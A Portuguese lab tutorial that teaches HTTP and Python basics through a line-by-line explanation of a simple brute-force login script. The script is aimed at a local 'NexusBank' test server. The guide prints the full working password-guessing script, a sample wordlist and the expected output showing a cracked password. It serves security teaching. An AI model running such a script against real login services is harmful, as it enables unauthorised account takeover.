# Guia Prático: Fundamentos de HTTP e Automação de Login

**Laboratório Prático:** NexusBank Corporate  
**Ambiente de Testes:** Python 3 + Biblioteca `requests`  
**Código de Apoio:** `bruteforce_simples.py`  

---

> ⚠️ **Aviso de Responsabilidade e Ética Profissional**  
> As técnicas demonstradas neste material têm como finalidade exclusiva o aprendizado de segurança defensiva e testes de autorização em ambiente de laboratório.  
> Qualquer execução contra sistemas de terceiros sem autorização prévia por escrito é ilegal, nos termos do **Marco Civil da Internet (Lei nº 12.965/2014)** e do **Artigo 154-A do Código Penal Brasileiro**.

---

## 1. O Modelo Cliente-Servidor na Prática

Quando acessamos um site ou utilizamos um aplicativo corporativo, a comunicação entre o seu computador e o servidor funciona em um modelo de **pergunta e resposta** (Requisição e Resposta):

```text
+-----------------------+                    +-----------------------+
|    CLIENTE (Script)   |                    |   SERVIDOR (NexusBank)|
|                       |  1. REQUISIÇÃO     |                       |
|  Envia usuário/senha  | -----------------> |  Processa os dados    |
|  via método POST      |                    |  e confere no banco   |
|                       |  2. RESPOSTA       |                       |
|  Lê o status_code     | <----------------- |  Devolve código 200   |
|  e decide se continua |                    |  ou 401 Unauthorized  |
+-----------------------+                    +-----------------------+
```

1. **Cliente:** É o programa que inicia o contato. Em um uso normal, é o navegador web (Chrome, Edge, Firefox). Em uma rotina de automação ou auditoria, é o nosso script Python.
2. **Servidor:** É o computador remoto onde o sistema está hospedado. Ele recebe a solicitação, valida os dados contra o banco de dados e devolve o resultado.

---

## 2. Estrutura de uma Requisição HTTP

Para conversar com o servidor, o script Python envia uma **Requisição HTTP**. Essa mensagem é composta por quatro elementos principais:

* **Método HTTP (Verbo):** Define a intenção da chamada:
  * `GET`: Solicita a leitura de dados (ex.: testar a saúde da API em `/api/saude`).
  * `POST`: Envia informações para o servidor processar ou validar (ex.: formulário de login).
* **Endpoint (URL / Rota):** O caminho específico do serviço no servidor.  
  *Exemplo:* `http://127.0.0.1:8002/login`
* **Headers (Cabeçalhos):** Metadados da comunicação (formato de dados, autorização, etc.).
* **Body / Payload (Corpo):** Os dados transmitidos. Em APIs REST, utiliza-se a formatação **JSON**:
  ```json
  {
    "usuario": "ana",
    "senha": "123456"
  }
  ```

---

## 3. Códigos de Status HTTP (`status_code`)

O servidor responde com um código numérico de 3 dígitos padronizado pela indústria:

| Código | Significado Oficial | Comportamento no Login do NexusBank |
| :---: | :--- | :--- |
| **`200`** | `OK` | **Sucesso.** O usuário e a senha enviados são válidos. |
| **`401`** | `Unauthorized` | **Credencial Inválida.** Usuário ou senha incorretos. |
| **`403`** | `Forbidden` | **Acesso Proibido.** A conta existe, mas não tem permissão para a rota. |
| **`404`** | `Not Found` | **Não Encontrado.** A rota solicitada não existe no servidor. |
| **`500`** | `Internal Server Error` | **Erro Interno.** Falha no processamento do servidor. |

> 💡 **A lógica central do teste:**  
> O script envia sucessivas requisições alterando apenas a senha. Enquanto receber **401**, ele descarta o palpite e continua. No instante em que receber **200**, significa que o sistema autorizou o acesso e a senha correta foi identificada.

---

## 4. Conceitos de Python Utilizados no Código

O script `bruteforce_simples.py` foi construído de forma linear, utilizando apenas 6 comandos fundamentais da linguagem:

### A. Variáveis de Configuração
Guardam os parâmetros da execução para fácil edição no topo do arquivo:
```python
url = "http://127.0.0.1:8002/login"
usuario = "ana"
arquivo_senhas = "senhas.txt"
```

### B. Leitura Segura de Arquivo com `with open(...)`
A instrução `with` garante que o arquivo seja aberto e, ao final do bloco, automaticamente fechado pelo sistema operacional, liberando a memória do computador:
```python
with open(arquivo_senhas, "r") as arquivo:
```
* `"r"` indica abertura para leitura (*read*).

### C. Laço de Repetição (`for linha in arquivo:`)
Percorre o arquivo linha a linha de maneira sequencial. A cada repetição, a variável `linha` recebe o texto da linha atual.

### D. Tratamento da Quebra de Linha com `.strip()`
Arquivos de texto possuem o caractere invisível de quebra de linha (`\n`), inserido pela tecla *Enter*.  
O método `.strip()` elimina esse caractere e espaços em branco das extremidades:
```python
senha = linha.strip()  # Converte "123456\n" para "123456"
```

### E. Disparo da Requisição HTTP com `requests.post()`
A biblioteca `requests` envia a requisição para a rede:
```python
dados = {"usuario": usuario, "senha": senha}
resposta = requests.post(url, json=dados)
```
* O parâmetro `json=dados` converte o dicionário Python para o formato JSON e define os cabeçalhos de rede automaticamente.

### F. Interrupção do Laço com `break`
Quando a senha correta é confirmada pelo código `200`, o comando `break` interrompe o laço `for` imediatamente, encerrando tentativas adicionais desnecessárias.

---

## 5. Análise Linha a Linha do Código

```python
 1 | import requests
 2 | 
 3 | # 1. Parâmetros de configuração
 4 | url = "http://127.0.0.1:8002/login"
 5 | usuario = "ana"
 6 | arquivo_senhas = "senhas.txt"
 7 | 
 8 | print("Iniciando o teste de autenticação...")
 9 | 
10 | # 2. Abertura do arquivo de senhas
11 | with open(arquivo_senhas, "r") as arquivo:
12 |     for linha in arquivo:
13 |         senha = linha.strip()
14 | 
15 |         # 3. Envio da requisição com a credencial atual
16 |         dados = {"usuario": usuario, "senha": senha}
17 |         resposta = requests.post(url, json=dados)
18 | 
19 |         print(f"Testando senha: {senha} -> Status: {resposta.status_code}")
20 | 
21 |         # 4. Avaliação da resposta do servidor
22 |         if resposta.status_code == 200:
23 |             print("\n>>> AUTENTICAÇÃO REALIZADA COM SUCESSO! <<<")
24 |             print(f"A senha do usuário '{usuario}' é: {senha}")
25 |             break
26 | 
27 | print("Processo finalizado.")
```

| Linhas | Instrução | Finalidade Técnica |
| :---: | :--- | :--- |
| `1` | `import requests` | Carrega o módulo responsável pelo tráfego de rede HTTP. |
| `4–6` | Definição de variáveis | Armazena a URL da API, o nome da conta e o arquivo de palavras. |
| `8` | `print(...)` | Informa no terminal que a rotina foi inicializada. |
| `11` | `with open(arquivo_senhas, "r")` | Abre o arquivo de texto em modo leitura com gestão automática de fechamento. |
| `12` | `for linha in arquivo:` | Lê sequencialmente cada registro presente no arquivo. |
| `13` | `senha = linha.strip()` | Limpa a string, removendo o caractere de terminação de linha (`\n`). |
| `16` | `dados = {"usuario": ..., "senha": ...}` | Monta o payload estruturado em formato chave-valor. |
| `17` | `resposta = requests.post(...)` | Envia os dados para o endpoint e armazena a resposta devolvida pela API. |
| `19` | `print(...)` | Imprime a tentativa atual e o código retornado pelo servidor. |
| `22` | `if resposta.status_code == 200:` | Compara o código numérico recebido com o valor de sucesso (`200`). |
| `23–24`| `print(...)` | Exibe a confirmação visual e a credencial válida identificada. |
| `25` | `break` | Interrompe o laço de repetição imediatamente. |
| `27` | `print(...)` | Sinaliza a conclusão da execução. |

---

## 6. Procedimento de Execução no Terminal

1. Certifique-se de que a biblioteca `requests` está instalada:
   ```bash
   pip install requests
   ```
2. Crie o arquivo `senhas.txt` na mesma pasta do script:
   ```text
   111111
   senha
   qwerty
   123456
   admin123
   ```
3. Execute o script:
   ```bash
   python bruteforce_simples.py
   ```
4. **Saída esperada:**
   ```text
   Iniciando o teste de autenticação...
   Testando senha: 111111 -> Status: 401
   Testando senha: senha -> Status: 401
   Testando senha: qwerty -> Status: 401
   Testando senha: 123456 -> Status: 200

   >>> AUTENTICAÇÃO REALIZADA COM SUCESSO! <<<
   A senha do usuário 'ana' é: 123456
   Processo finalizado.
   ```
